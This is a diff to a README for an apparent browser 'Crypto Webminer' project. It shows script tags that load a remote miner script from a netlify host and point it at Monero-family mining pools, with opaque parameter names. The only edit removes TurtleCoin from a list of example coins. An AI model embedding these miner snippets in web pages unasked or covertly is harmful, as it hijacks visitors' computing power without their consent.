@@ -25,7 +25,7 @@ Crypto Webminer | Electroneum | Monero | Bytecoin | IntenseCoin | Graft | Sumoko
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn/xtl?variant=2?jason=communitypool.stellite.cash:6677" > </script>
 ```
-#### Examples: CN Lite V7 Coins (Aeon, TurtleCoin, BitcoiNote, BBSCoin, Triton) need ?algo=cn-lite?variant=1
+#### Examples: CN Lite V7 Coins (Aeon, BitcoiNote, BBSCoin, Triton) need ?algo=cn-lite?variant=1
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn-lite?variant=1?jason=mine.supportaeon.com:3333" > </script>
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn-lite?variant=1?jason=Pool.TRTL.CryptoPool.Space:5555" > </script>
